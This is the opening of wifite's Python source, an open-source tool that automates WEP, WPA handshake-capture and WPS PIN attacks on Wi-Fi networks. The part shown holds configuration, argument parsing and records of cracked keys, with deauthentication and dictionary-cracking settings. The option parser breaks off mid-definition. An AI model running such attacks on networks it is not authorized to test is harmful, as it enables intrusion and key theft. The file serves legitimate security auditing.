#!/usr/bin/python

# -*- coding: utf-8 -*-

"""
    wifite

    author: derv82 at gmail
    author: bwall @botnet_hunter (ballastsec@gmail.com)
    author: drone @dronesec (ballastsec@gmail.com)
    author: brianpow at gmail

    Thanks to everyone that contributed to this project.
    If you helped in the past and want your name here, shoot me an email

    Licensed under the GNU General Public License Version 2 (GNU GPL v2),
        available at: http://www.gnu.org/licenses/gpl-2.0.txt

    (C) 2011 Derv Merkler

    Ballast Security additions
    -----------------
     - No longer requires to be root to run -cracked
     - cracked.txt changed to cracked.csv and stored in csv format(easier to read, no \x00s)
         - Backwards compatibility
     - Made a run configuration class to handle globals
     - Added -recrack (shows already cracked APs in the possible targets, otherwise hides them)
     - Changed the updater to grab files from GitHub and not Google Code
     - Use argparse to parse command-line arguments
     - -wepca flag now properly initialized if passed through CLI
     - parse_csv uses python csv library
    -----------------


    TODO:

    Restore same command-line switch names from v1

    If device already in monitor mode, check for and, if applicable, use macchanger

     WPS
     * Mention reaver automatically resumes sessions
     * Warning about length of time required for WPS attack (*hours*)
     * Show time since last successful attempt
     * Percentage of tries/attempts ?
     * Update code to work with reaver 1.4 ("x" sec/att)

     WEP:
     * ability to pause/skip/continue    (done, not tested)
     * Option to capture only IVS packets (uses --output-format ivs,csv)
       - not compatible on older aircrack-ng's.
           - Just run "airodump-ng --output-format ivs,csv", "No interface specified" = works
         - would cut down on size of saved .caps

     reaver:
          MONITOR ACTIVITY!
          - Enter ESSID when executing (?)
       - Ensure WPS key attempts have begun.
       - If no attempts can be made, stop attack

       - During attack, if no attempts are made within X minutes, stop attack & Print

       - Reaver's output when unable to associate:
         [!] WARNING: Failed to associate with AA:BB:CC:DD:EE:FF (ESSID: ABCDEF)
       - If failed to associate for x minutes, stop attack (same as no attempts?)

    MIGHTDO:
      * WPA - crack (pyrit/cowpatty) (not really important)
      * Test injection at startup? (skippable via command-line switch)

"""

# ############
# LIBRARIES #
#############

import csv  # Exporting and importing cracked aps
import os  # File management
import time  # Measuring attack intervals
import random  # Generating a random MAC address.
import errno  # Error numbers
import math

from sys import argv  # Command-line arguments
from sys import stdout  # Flushing

from shutil import copy  # Copying .cap files

# Executing, communicating with, killing processes
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM

import re  # RegEx, Converting SSID to filename
import argparse  # arg parsing
import urllib  # Check for new versions from the repo
import abc  # abstract base class libraries for attack templates


################################
# GLOBAL VARIABLES IN ALL CAPS #
################################

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

# /dev/null, send output from programs so they don't print to screen.
DN = open(os.devnull, 'w')
ERRLOG = open(os.devnull, 'w')
OUTLOG = open(os.devnull, 'w')

UPDATE_URLS=["https://github.com/derv82/wifite/raw/master/wifite.py","https://github.com/brianpow/wifite/raw/master/wifite.py"]
###################
# DATA STRUCTURES #
###################


class CapFile:
    """
        Holds data about an access point's .cap file, including AP's ESSID & BSSID.
    """

    def __init__(self, filename, ssid, bssid):
        self.filename = filename
        self.ssid = ssid
        self.bssid = bssid


class Target:
    """
        Holds data for a Target (aka Access Point aka Router)
    """

    def __init__(self, bssid, power, data, channel, encryption, ssid, wps = False, key=""):
        self.bssid = bssid
        self.power = power
        self.data = data
        self.channel = channel
        self.encryption = encryption
        self.ssid = ssid
        self.wps = wps  # Default to non-WPS-enabled router.
        self.key = key
    def __str__(self):
        return re.sub(r'[^a-zA-Z0-9]', '', self.ssid) \
                  + '_' + self.bssid.replace(':', '-') + '_' + self.encryption.lower()
    def equal(self,target):
        #if target is
        if target.bssid == self.bssid:
            return True
    def find_clients(self, clients):
        associated_clients=[]
        for client in clients:
            if client.station == self.bssid:
                associated_clients.append(client)
        return associated_clients
    def count_clients(self, clients):
        return len(self.find_clients(clients))
class Client:
    """
        Holds data for a Client (device connected to Access Point/Router)
    """

    def __init__(self, bssid, station, power, essid = ""):
        self.bssid = bssid
        self.station = station
        self.power = power
        self.essid = essid


class RunConfiguration:
    """
        Configuration for this rounds of attacks
    """

    def __init__(self):
        self.REVISION = 92;
        self.PRINTED_SCANNING = False
        
        #INTERFACE
        self.TX_POWER = 0  # Transmit power for wireless interface, 0 uses default power

        #TARGET
        self.SCAN_FILE_LOAD=""
        self.SCAN_FILE_SAVE=""
        self.SHOW_TARGET=""
        self.ATTACK_TARGET=""
        self.SCAN_TIMEOUT=0
        self.COLUMN = 1     # Numbers of columns in scanning state
        self.SPACING = 1    # Spacing between Columns
        self.SCAN_MAX_ROW_SHOW = 0
        self.SCAN_DEAUTH_TIMEOUT = 10
        # WPA variables
        #self.WPA_DISABLE = False  # Flag to skip WPA handshake capture
        self.WPA_ATTACK_DISABLE=False
        self.WPA_STRIP_HANDSHAKE = True  # Use pyrit or tshark (if applicable) to strip handshake
        self.WPA_DEAUTH_COUNT = 5  # Count to send deauthentication packets
        self.WPA_DEAUTH_TIMEOUT = 10  # Time to wait between deauthentication bursts (in seconds)
        self.WPA_ATTACK_TIMEOUT = 500  # Total time to allow for a handshake attack (in seconds)
        self.WPA_HANDSHAKE_DIR = 'hs'  # Directory in which handshakes .cap files are stored
        
        # Move old hs folder to wpa folder
        if not os.path.exists(self.WPA_HANDSHAKE_DIR):
            self.WPA_HANDSHAKE_DIR='wpa'
        elif not os.path.exists('wpa'):
            call(['mv',self.WPA_HANDSHAKE_DIR,'wpa'])
            self.WPA_HANDSHAKE_DIR='wpa'
        # Strip file path separator if needed
        if self.WPA_HANDSHAKE_DIR != '' and self.WPA_HANDSHAKE_DIR[-1] != os.sep:
            self.WPA_HANDSHAKE_DIR += os.sep

        self.WPA_RECAPTURE_HS=False        
        self.WPA_FINDINGS = []  # List of strings containing info on successful WPA attacks
        self.WPA_DONT_CRACK = False  # Flag to skip cracking of handshakes
        self.WPA_DICTIONARY = '/pentest/web/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
        if not os.path.exists(self.WPA_DICTIONARY): self.WPA_DICTIONARY = ''

        # Various programs to use when checking for a four-way handshake.
        # True means the program must find a valid handshake in order for wifite to recognize a handshake.
        # Not finding handshake short circuits result (ALL 'True' programs must find handshake)
        self.WPA_HANDSHAKE_TSHARK = True  # Checks for sequential 1,2,3 EAPOL msg packets (ignores 4th)
        self.WPA_HANDSHAKE_PYRIT = False  # Sometimes crashes on incomplete dumps, but accurate.
        self.WPA_HANDSHAKE_AIRCRACK = True  # Not 100% accurate, but fast.
        self.WPA_HANDSHAKE_COWPATTY = False  # Uses more lenient "nonstrict mode" (-2)

        # WEP variables
        #self.WEP_DISABLE = False  # Flag for ignoring WEP networks
        self.WEP_IVS_DIR = 'wep'  # Directory in which WEP IVS files are stored
        if self.WEP_IVS_DIR != '' and self.WEP_IVS_DIR[-1] != os.sep:
            self.WEP_IVS_DIR += os.sep
        self.WEP_PPS = 600  # packets per second (Tx rate)
        self.WEP_TIMEOUT = 600  # Amount of time to give each attack
        self.WEP_ARP_REPLAY = True  # Various WEP-based attacks via aireplay-ng
        self.WEP_CHOPCHOP = True  #
        self.WEP_FRAGMENT = True  #
        self.WEP_CAFFELATTE = True  #
        self.WEP_P0841 = True
        self.WEP_HIRTE = True
        self.WEP_CRACK_AT_IVS = 10000  # Number of IVS at which we start cracking
        self.WEP_IGNORE_FAKEAUTH = True  # When True, continues attack despite fake authentication failure
        self.WEP_FINDINGS = []  # List of strings containing info on successful WEP attacks.
        self.WEP_SAVE = False  # Save packets.

        # WPS variables
        self.WPS_CHECK_DISABLE = False  # Flag to skip WPS scan
        self.WPS_ATTACK_DISABLE=False
        self.WPS_FINDINGS = []  # List of (successful) results of WPS attacks
        self.WPS_TIMEOUT = 660  # Time to wait (in seconds) for successful PIN attempt
        self.WPS_RATIO_THRESHOLD = 0.01  # Lowest percentage of tries/attempts allowed (where tries > 0)
        self.WPS_MAX_RETRIES = 0  # Number of times to re-try the same pin before giving up completely.
        self.WPS_SESSION_DIR = 'wps'  # Directory in which handshakes .cap files are stored
        self.WPS_SAVE = None
        # Add file path separator if needed
        if self.WPS_SESSION_DIR != '' and self.WPS_SESSION_DIR[-1] != os.sep:
            self.WPS_SESSION_DIR += os.sep

        # Program variables
        self.SHOW_ALREADY_CRACKED = False  # Says whether to show already cracked APs as options to crack
        self.WIRELESS_IFACE = ''  # User-defined interface
        self.MONITOR_IFACE = ''  # User-defined interface already in monitor mode
        self.TARGET_CHANNEL = 0  # User-defined channel to scan on
        self.TARGET_ESSID = ''  # User-defined ESSID of specific target to attack
        self.TARGET_BSSID = ''  # User-defined BSSID of specific target to attack
        self.IFACE_TO_TAKE_DOWN = ''  # Interface that wifite puts into monitor mode
        # It's our job to put it out of monitor mode after the attacks
        self.ORIGINAL_IFACE_MAC = ('', '')  # Original interface name[0] and MAC address[1] (before spoofing)
        self.DO_NOT_CHANGE_MAC = True  # Flag for disabling MAC anonymizer
        self.TARGETS_REMAINING = 0  # Number of access points remaining to attack
        self.WPA_CAPS_TO_CRACK = []  # list of .cap files to crack (full of CapFile objects)
        self.THIS_MAC = ''  # The interfaces current MAC address.
        self.SHOW_MAC_IN_SCAN = False  # Display MACs of the SSIDs in the list of targets
        self.CRACKED_TARGETS = []  # List of targets we have already cracked
        self.CRACKED_RECORD="cracked.csv"
        self.DECLOAKED_RECORD="decloaked.csv"
        #self.ATTACK_ALL_TARGETS = False  # Flag for when we want to attack *everyone*
        #self.ATTACK_MIN_POWER = 0  # Minimum power (dB) for access point to be considered a target
        self.VERBOSE_APS = True  # Print access points as they appear
        self.CRACKED_TARGETS = self.load_cracked()
        self.DECLOAKED_TARGETS = self.load_decloaked()
        self.DEBUG = False
        old_cracked = self.load_old_cracked()
        if len(old_cracked) > 0:
            # Merge the results
            for OC in old_cracked:
                new = True
                for NC in self.CRACKED_TARGETS:
                    if OC.bssid == NC.bssid:
                        new = False
                        break
                # If Target isn't in the other list
                # Add and save to disk
                if new:
                    self.save_cracked(OC)
        self.temp = ""
    def ConfirmRunningAsRoot(self):
        if os.getuid() != 0:
            println_error('ERROR:' + G + ' wifite' + O + ' must be run as ' + R + 'root')
            println_error('login as root (' + W + 'su root' + O + ') or try ' + W + 'sudo ./wifite.py')
            exit(1)

    def ConfirmCorrectPlatform(self):
        if not 'uname' in dir(os) or not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]:  # OSX support, 'cause why not?
            println_error(G + ' wifite' + W + ' must be run on ' + O + 'linux' + W)
            exit(1)

    def CreateTempFolder(self):
        from tempfile import mkdtemp

        self.temp = mkdtemp(prefix='wifite' + str(time.time()))
        if not self.temp.endswith(os.sep):
            self.temp += os.sep
        println_info("temp folder %s" % self.temp)
    def load_decloaked(self):
        result = []
        filename=self.DECLOAKED_RECORD
        if not os.path.exists(filename): return result
        with open(filename, 'rb') as csvfile:
            targetreader = csv.reader(csvfile, delimiter=',', quotechar='"')
            for i,target in enumerate(targetreader):
                if i != 0 or target[0] != "SSID":
                    # bssid, power, data, channel, encryption, ssid, wps = False, key=""):
                    result.append(Target(target[1],0,0,target[2],target[3],target[0],bool(target[4])))
        return result
    def save_decloaked(self, target):
        self.DECLOAKED_TARGETS.append(target)
        filename = self.DECLOAKED_RECORD
        with open(filename, 'wb') as csvfile:
            targetwriter = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            try:
                targetwriter.writerow(["SSID", "BSSID",  "Channel", "Encryption", "WPS?", "Create Date"])
                for target in self.DECLOAKED_TARGETS:
                    targetwriter.writerow([target.ssid, target.bssid,  target.channel, target.encryption, target.wps, time.strftime("%Y-%m-%d %H:%M:%S")])
            except:
                println_error("unable to save decloaked target to %s!" % G + filename + W)
                pass
    def save_cracked(self, target):
        """
            Saves cracked access point key and info to a file.
        """
        self.CRACKED_TARGETS.append(target)
        filename = self.CRACKED_RECORD
        with open(filename, 'wb') as csvfile:
            targetwriter = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            try:
                for target in self.CRACKED_TARGETS:
                    targetwriter.writerow([target.bssid, target.encryption, target.ssid, target.key, target.wps])
            except:
                println_error("unable to save cracked target to %s!" % G + filename + W)
                pass
    def load_cracked(self):
        """
            Loads info about cracked access points into list, returns list.
        """
        result = []
        filename=self.CRACKED_RECORD
        if not os.path.exists(filename): return result
        with open(filename, 'rb') as csvfile:
            targetreader = csv.reader(csvfile, delimiter=',', quotechar='"')
            for row in targetreader:
                t = Target(row[0], 0, 0, 0, row[1], row[2], row[4],row[3])
                result.append(t)
        return result

    def load_old_cracked(self):
        """
                Loads info about cracked access points into list, returns list.
        """
        result = []
        if not os.path.exists('cracked.txt'):
            return result
        fin = open('cracked.txt', 'r')
        lines = fin.read().split('\n')
        fin.close()

        for line in lines:
            fields = line.split(chr(0))
            if len(fields) <= 3:
                continue
            tar = Target(fields[0], '', '', '', fields[3], fields[1])
            tar.key = fields[2]
            result.append(tar)
        return result
    def temp_clean_up(self):
        if self.temp != "" and os.path.exists(self.temp):
            for f in os.listdir(self.temp):
                os.remove(self.temp + f)
            os.rmdir(self.temp)
    def exit_gracefully(self, code=0):
        """
            We may exit the program at any time.
            We want to remove the temp folder and any files contained within it.
            Removes the temp files/folder and exists with error code "code".
        """
        # Remove temp files and folder
        
        self.temp_clean_up()
        # Disable monitor mode if enabled by us
        self.RUN_ENGINE.disable_monitor_mode()
        # Change MAC address back if spoofed
        mac_change_back()
        println_info("quitting")  # wifite will now exit"
        print ''
        # GTFO
        exit(code)

    def handle_args(self):
        """
            Handles command-line arguments, sets global variables.
        """
        #set_encrypt = False
        set_hscheck = False
        set_wep = False
        capfile = ''  # Filename of .cap file to analyze for handshakes

        opt_parser = self.build_opt_parser()
        options = opt_parser.parse_args()
    
        try:
            '''
            if not set_encrypt and (options.wpa or options.wep or options.wps):
                self.WPS_DISABLE = True
                self.WPA_DISABLE = True
                self.WEP_DISABLE = True
                set_encrypt = True
            '''
            if options.recrack:
                self.SHOW_ALREADY_CRACKED = True
                println_info('including already cracked networks in targets.')
            if options.timeout != None:
                if options.timeout.isdigit():
                    if int(options.timeout.isdigit())>=0:
                        self.SCAN_TIMEOUT=options.timeout
                    else:
                        println_error('invalid timeout value %s' % (G + str(options.timeout) + W))

                    #println_info('criteria to stop scanning state: ' + G + str(options.timeout) + W)
                else:
                    self.SCAN_TIMEOUT=options.timeout
                    #println_error('invalid timeout value %s' % (G + str(options.timeout) + W))
            if options.load != None:
                self.SCAN_FILE_LOAD=options.load
            if options.save != None:
                self.SCAN_FILE_SAVE=options.save
            if options.show:
                self.SHOW_TARGET=options.show
                println_info('filter targets in scanning state: ' + G + options.show)
            if options.scan_max_row_show > 0:
                self.SCAN_MAX_ROW_SHOW = options.scan_max_row_show
                println_info('max rows of targets to show in scanning state: ' + G + str(options.scan_max_row_show))
            if options.attack:
                self.ATTACK_TARGET=options.attack
            if options.wpa:
                if self.SHOW_TARGET != "": self.SHOW_TARGET + ","
                self.SHOW_TARGET+="wpa"
                #if self.ATTACK_TARGET != "": self.ATTACK_TARGET + ","
                #self.ATTACK_TARGET+="wpa"
                #if options.wps:
                if options.wps:
                    println_info('showing ' + G + 'WPA' + W + ' encrypted networks.')
                else:
                    println_info('showing ' + G + 'WPA' + W + ' encrypted networks (use ' + G + '--wps' + W + ' for WPS scan)')
                    self.WPS_ATTACK_DISABLE=true
                #self.WPA_ATTACK_DISABLE = False
            self.WPA_RECAPTURE_HS = options.recapture
            if options.wep:
                if self.SHOW_TARGET != "": self.SHOW_TARGET + ","
                self.SHOW_TARGET+="wep"
                #if self.ATTACK_TARGET != "": self.ATTACK_TARGET + ","
                #self.ATTACK_TARGET+="wep"
                println_info('showing ' + G + 'WEP' + W + ' encrypted networks')
                #self.WEP_DISABLE = False
            if options.wps:
                if self.SHOW_TARGET != "": self.SHOW_TARGET + ","
                self.SHOW_TARGET="wps"
                #if self.ATTACK_TARGET != "": self.ATTACK_TARGET + ","
                #self.ATTACK_TARGET="wps"
                if not options.wpa:
                    self.WPA_ATTACK_DISABLE = true
                println_info('showing ' + G + 'WPS-enabled' + W + ' networks.')
                #self.WPS_CHECK_DISABLE = False
                #self.WPS_ATTACK_DISABLE = False
            if options.nowps:
                self.WPS_ATTACK_DISABLE = True
                println_info('wPS PIN attack ' + G + 'disabled')
            if options.nowpa:
                self.WPA_ATTACK_DISABLE = True
                println_info('wPS handshake attack ' + G + 'disabled')
            if options.channel:
                channel=options.channel
                if( channel>= 1 and channel<=12):
                    self.TARGET_CHANNEL = channel
                    println_info('Filter channel in scanning state: %s' % (G + str(self.TARGET_CHANNEL) + W))
                else:
                    println_warning('invalid channel: ' + O + str(options.channel) + W)

            if options.mac_anon:
                println_info('mac address anonymizing ' + G + 'enabled' + W + "\n" +'      not: only works if device is not already in monitor mode!' + W)
                self.DO_NOT_CHANGE_MAC = False
            if options.interface:
                self.WIRELESS_IFACE = options.interface
                println_info('set interface :%s' % (G + self.WIRELESS_IFACE + W))
            if options.monitor_interface:
                self.MONITOR_IFACE = options.monitor_interface
                println_info('set interface already in monitor mode :%s' % (G + self.MONITOR_IFACE + W))
            if options.essid:
                #try:
                    self.TARGET_ESSID = options.essid
                #except ValueError:
                #    println_error('no ESSID given!' + W
                #else:
                    println_info('targeting ESSID "%s"' % (G + self.TARGET_ESSID + W))
            if options.bssid:
                #try:
                    self.TARGET_BSSID = options.bssid
                #except ValueError:
                #    println_error('no BSSID given!' + W
                #else:
                    println_info('targeting BSSID "%s"' % (G + self.TARGET_BSSID + W))
            if options.showb:
                self.SHOW_MAC_IN_SCAN = True
                println_info('target MAC address viewing ' + G + 'enabled')
            if options.all:
                #self.ATTACK_ALL_TARGETS = True
                self.ATTACK_TARGET= 'all'
                self.SCAN_TIMEOUT = 10
                println_info('targeting ' + G + 'all access points')
            if options.power:
                #try:
                if options.power > 0 and options.power <= 100:
                    if self.SHOW_TARGET!="":
                        self.SHOW_TARGET+=","
                    self.SHOW_TARGET+="-p<=" + power
                else:
                    println_error('invalid power level: %s' % (R + str(options.power)+ W))
                #except IndexError:
                #    println_error('no power level given!' + W
                #else:
                #    println_info('minimum target power set to %s' % (G + str(self.ATTACK_MIN_POWER) + W))
            if options.two:
                self.COLUMN = 2
            if options.tx  != None:
                if options.tx >= 0:
                    self.TX_POWER = options.tx
                    println_info('TX power level set to %s' % (G + str(self.TX_POWER) + W))
                else:
                    println_error('invalid TX power leve: %s' % ( R + str(options.tx) + W))
                #except IndexError:
                #    println_error('no TX power level given!')
                #else:
            self.DEBUG=options.debug
            if options.quiet:
                self.VERBOSE_APS = False
                println_info('list of APs during scan ' + O + 'disabled')
            if options.check:
                try:
                    capfile = options.check
                except IndexError:
                    println_error('unable to analyze capture file')
                    println_error('no cap file given!\n')
                    self.exit_gracefully(1)
                else:
                    if not os.path.exists(capfile):
                        println_error('unable to analyze capture file!')
                        println_error('file not found: ' + R + capfile + '\n')
                        self.exit_gracefully(1)
            if options.update:
                self.update()
                exit(0)
            if options.cracked:
                if len(self.CRACKED_TARGETS) == 0:
                    println_error('There are no cracked access points saved to ' + R + 'cracked.db\n')
                    self.exit_gracefully(1)
                println_info('' + W + 'previously cracked access points' + W + ':')
                for victim in self.CRACKED_TARGETS:
                    if victim.wps != False:
                        println_info('     %s (%s) : "%s" - Pin: %s' % (C + victim.ssid + W, C + victim.bssid + W, G + victim.key + W, G + victim.wps + W))
                    else:
                        println_info('     %s (%s) : "%s"' % (C + victim.ssid + W, C + victim.bssid + W, G + victim.key + W))
                print ''
                self.exit_gracefully(0)
            # WPA
            if not set_hscheck and (options.tshark or options.cowpatty or options.aircrack or options.pyrit):
                self.WPA_HANDSHAKE_TSHARK = False
                self.WPA_HANDSHAKE_PYRIT = False
                self.WPA_HANDSHAKE_COWPATTY = False
                self.WPA_HANDSHAKE_AIRCRACK = False
                set_hscheck = True
            if options.strip:
                self.WPA_STRIP_HANDSHAKE = True
                println_info('handshake stripping ' + G + 'enabled')
            if options.wpadt  != None:
                if options.wpadt >= 0:
                    self.WPA_DEAUTH_TIMEOUT = options.wpadt
                    println_info('WPA deauth timeout set to %s' % (G + str(self.WPA_DEAUTH_TIMEOUT) + W))
                else:
                    println_error('invalid deauth timeout: %s' % (R + str(options.wpadt) + W))
            if options.wpat  != None:
                if options.wpat >= 0:
                    self.WPA_ATTACK_TIMEOUT = int(options.wpat)
                    println_info('WPA attack timeout set to %s' % (G + str(self.WPA_ATTACK_TIMEOUT) + W))
                else:
                    println_error('invalid attack timeout: %s' % (R + str(options.wpat) + W))
                    
            if options.crack:
                self.WPA_DONT_CRACK = False
                println_info('WPA cracking ' + G + 'enabled')
                if options.dic:
                    if os.path.exists(options.dic):
                        self.WPA_DICTIONARY=options.dic
                        println_info('WPA dictionary set to %s' % (G + self.WPA_DICTIONARY + W))
                    else:
                        println_error('WPA dictionary file not found: %s' % (G + options.dic + W))
	        if self.WPA_DICTIONARY == "" and file_search('phpbb.txt'):
                        self.WPA_DICTIONARY=file_search('phpbb.txt')
                        println_info('WPA dictionary automatically set to %s' % (G + self.WPA_DICTIONARY + W))
                if self.WPA_DICTIONARY == "":
                    println_error('WPA dictionary file not given!')
                    self.exit_gracefully(1)
            if options.tshark:
                self.WPA_HANDSHAKE_TSHARK = True
                println_info('tshark handshake verification ' + G + 'enabled')
            if options.pyrit:
                self.WPA_HANDSHAKE_PYRIT = True
                println_info('pyrit handshake verification ' + G + 'enabled')
            if options.aircrack:
                self.WPA_HANDSHAKE_AIRCRACK = True
                println_info('aircrack handshake verification ' + G + 'enabled')
            if options.cowpatty:
                self.WPA_HANDSHAKE_COWPATTY = True
                println_info('cowpatty handshake verification ' + G + 'enabled')

            # WEP
            if not set_wep and options.chopchop or options.fragment or options.caffeelatte or options.arpreplay \
                    or options.p0841 or options.hirte:
                self.WEP_CHOPCHOP = False
                self.WEP_ARPREPLAY = False
                self.WEP_CAFFELATTE = False
                self.WEP_FRAGMENT = False
                self.WEP_P0841 = False
                self.WEP_HIRTE = False
            if options.chopchop:
                println_info('WEP chop-chop attack ' + G + 'enabled')
                self.WEP_CHOPCHOP = True
            if options.fragment:
                println_info('WEP fragmentation attack ' + G + 'enabled')
                self.WEP_FRAGMENT = True
            if options.caffeelatte:
                println_info('WEP caffe-latte attack ' + G + 'enabled')
                self.WEP_CAFFELATTE = True
            if options.arpreplay:
                println_info('WEP arp-replay attack ' + G + 'enabled')
                self.WEP_ARPREPLAY = True
            if options.p0841:
                println_info('WEP p0841 attack ' + G + 'enabled')
                self.WEP_P0841 = True
            if options.hirte:
                println_info('WEP hirte attack ' + G + 'enabled')
                self.WEP_HIRTE = True
            if options.fakeauth:
                println_info('ignoring failed fake-authentication ' + R + 'disabled')
                self.WEP_IGNORE_FAKEAUTH = False
            if options.wepca:
                if options.wepca>0:
                    self.WEP_CRACK_AT_IVS = options.wepca
                    println_info('Starting WEP cracking when IV\'s surpass %s' % (
                    G + str(self.WEP_CRACK_AT_IVS) + W))
                else:
                    println_error('invalid number: %s' % ( R + str(options.wepca) + W ))
                
            if options.wept != None:
                if options.wept >= 0:
                    self.WEP_TIMEOUT = options.wept
                    println_info('WEP attack timeout set to %s' % (
                    G + str(self.WEP_TIMEOUT) + W + " seconds"))
                else:
                    println_error('invalid timeout: %s' % (R + str(options.wept) + W))
               
            if options.pps  != None:
                if options.pps>0:
                    self.WEP_PPS = options.pps
                    println_info('packets-per-second rate set to %s' % (
                    G + str(options.pps) + " packets/sec" + W))
                else:
                    println_error('invalid value: %s' % (R + str(options.pps) + W))
            if options.wepsave:
                self.WEP_SAVE = True
                println_info('WEP .cap file saving ' + G + 'enabled' + W)

            # WPS
            if options.wpst  != None:
                if self.WPS_TIMEOUT >= 0:
                    self.WPS_TIMEOUT = options.wpst
                    println_info('WPS attack timeout set to %s' % (
                    G + str(self.WPS_TIMEOUT) + " seconds" + W))
                else:
                    println_error('invalid WPS timeout: %s' % (R + str(options.wpst) + W))
            
            self.WPS_SAVE = options.wpssave
            if options.wpssave:
                println_info('WPS .wpc file saving ' + G + 'enabled' + W)

            if options.wpsratio != None:
                if options.wpsratio > 0:
                    self.WPS_RATIO_THRESHOLD = options.wpsratio
                    println_info('minimum WPS tries/attempts threshold set to %s' % (G + str(self.WPS_RATIO_THRESHOLD) + W))
                else:
                    println_warning('invalid percentage: %s' % (R + options.wpsratio + W))
            
            if options.wpsretry:
                if options.wpsretry >= 0:
                    self.WPS_MAX_RETRIES = int(options.wpsretry)
                    println_info('WPS maximum retries set to %s retries' % (
                        G + str(self.WPS_MAX_RETRIES) + W))
                else:
                    println_error('invalid number: %s' % (R + str(options.wpsretry) + W))
                    

        except IndexError:
            println_warning('\nIndex Error!\n\n')

        if capfile != '':
            self.RUN_ENGINE.analyze_capfile(capfile)
        #print ''

    def build_opt_parser(self):
        """ Options are doubled for backwards compatability; will be removed soon and
            fully moved to GNU-style
        """
        option_parser = argparse.ArgumentParser()

        # set commands
        command_group = option_parser.add_argument_group('COMMAND')
        command_group.add_argument('--check', metavar='[file]', help='Check capfile [file] for handshakes.', action='store', dest='check')
        command_group.add_argument('-check', action='store', dest='check', help=argparse.SUPPRESS)
        command_group.add_argument('--cracked', help='Display previously cracked access points.', action='store_true',
                                   dest='cracked')
        command_group.add_argument('-cracked', help=argparse.SUPPRESS, action='store_true', dest='cracked')
        command_group.add_argument('--recrack', help='Include already cracked networks in targets.',
                                   action='store_true', dest='recrack')
        command_group.add_argument('-recrack', help=argparse.SUPPRESS, action='store_true', dest='scan')

        # set global
        interface_group = option_parser.add_argument_group('INTERFACE')
        interface_group.add_argument('-i', metavar='[wlanN]', help='Wireless interface for capturing.', action='store', dest='interface')
        interface_group.add_argument('--mac', help='Anonymize MAC address.', action='store_true', default=False,
                                  dest='mac_anon')
        interface_group.add_argument('-mac', help=argparse.SUPPRESS, action='store_true', default=False, dest='mac_anon')
        interface_group.add_argument('-m','--mon-iface', metavar='[monN]', help='Interface already in monitor mode.', action='store',
                                  dest='monitor_interface')
        interface_group.add_argument('--tx', metavar='[N]', help='Set adapter TX power level.', action='store', dest='tx')
        interface_group.add_argument('-tx', metavar='[N]', help=argparse.SUPPRESS, action='store', dest='tx')        

        target_group = option_parser.add_argument_group('TARGET')
        target_group.add_argument('-l','--load', metavar='[file]', help='Load airodump file instead of scanning.', action='store', dest='load')
        target_group.add_argument('-v','--save', metavar='[file]', help='Save airodump file.', action='store', dest='save')
        target_group.add_argument('-s','--show', metavar='[filters]', help='Filter targets in scanning state.' + 'Syntax: numbers, range (e.g. "1-4"), power level (e.g. "p[>,>=,=,<=,<][POWER]"), channel (e.g. "c[CHANNEL,range])", wps disabled or enabled (e.g. "wps0", "wps1"), Cipher (e.g. "wep" or "wpa", "wep[NUM OF CLIENT]" or "wpa[NUM OF CLIENT]", "wep+" or "wpa+" for network with clients), ESSID (e.g. "e[ESSID]") or BSSID (e.g. "b[11:22:33]"). Multiple filters separated by comma supported. Add "-" or "=" before to remove targets.', action='store', dest='show')
        target_group.add_argument('-t','--timeout', metavar='[criteria]', help='Criteria to stop scanning state. Numbers = seconds, e[ESSID][+] or b[BSSID][+]= timeout when target is found, add "+" at the end means "with clients", n[>,>=,=,<=,<][num of targets] = timeout when total targets more/equal/less than certain numbers. Multiple criteria separated by comma supported.', action='store', dest='timeout')
        target_group.add_argument('-c','--channel', metavar='[N]', type=int, help='Filter targets with specific channel in scanning state (equivalent to "--show c[N]").', action='store', dest='channel')
        target_group.add_argument('--power', metavar='[N]',type=int, help='Filter targets with signal strength > [N] in scanning state (equivalent to "--show p\>[N]").', action='store',
                                  dest='power')
        target_group.add_argument('-power', metavar='[N]', type=int, help=argparse.SUPPRESS, action='store', dest='power')

        target_group.add_argument('--all', help='Attack all targets (equivalent to "--show all --attack all --timeout 10").', default=False, action='store_true', dest='all')
        target_group.add_argument('-all', help=argparse.SUPPRESS, default=False, action='store_true', dest='all')
        target_group.add_argument('-r','--row', type=int, metavar='[N]', help='Max numbers of row to show in scanning state.', default=0, action='store', dest='scan_max_row_show')
        
        target_group.add_argument('--showb', help='Show target BSSIDs in scanning state.', action='store_true',
                                  dest='showb')
        target_group.add_argument('-showb', help=argparse.SUPPRESS, action='store_true', dest='showb')
        target_group.add_argument('-2','--two', help='Show scanning result in two columns.', default=False, action='store_true',
                                  dest='two')
        target_group.add_argument('-q','--quiet', help='Do not print list of APs during scan.', action='store_true',
                                  dest='quiet')
        target_group.add_argument('-a','--attack', metavar='[filters]', help='Automatically select targets after scanning state, same syntas as "--show".', action='store', dest='attack')
        #target_group.add_argument('-attack', help=argparse.SUPPRESS, action='store', dest='attack')
        target_group.add_argument('-e','--essid', metavar='[SSID]', help='Attack target immediately once ssid (name) is found in scanning state.', action='store',
                                  dest='essid')
        #target_group.add_argument('-e', help=argparse.SUPPRESS, action='store', dest='essid')
        target_group.add_argument('-b','--bssid', metavar='[BSSID]',help='Attack target immediately once bssid (mac) is found in scanning state.', action='store',
                                  dest='bssid')
        #target_group.add_argument('-b', help=argparse.SUPPRESS, action='store', dest='bssid')
       
            
        

        # set wpa commands
        wpa_group = option_parser.add_argument_group('WPA')
        wpa_group.add_argument('--wpa', help='Only show WPA networks in scanning state (works with --wps --wep, equivalent to "--show wpa --nowps").', default=False,
                               action='store_true', dest='wpa')
        wpa_group.add_argument('-wpa', help=argparse.SUPPRESS, default=False, action='store_true', dest='wpa')
        wpa_group.add_argument('--wpat', metavar='[secs]', type=int, help='Time to wait for WPA attack to complete (seconds).', action='store',
                               dest='wpat')
        wpa_group.add_argument('--nowpa', help='Disable WPA handshake attack.', default=False,
                               action='store_true', dest='nowpa')
        
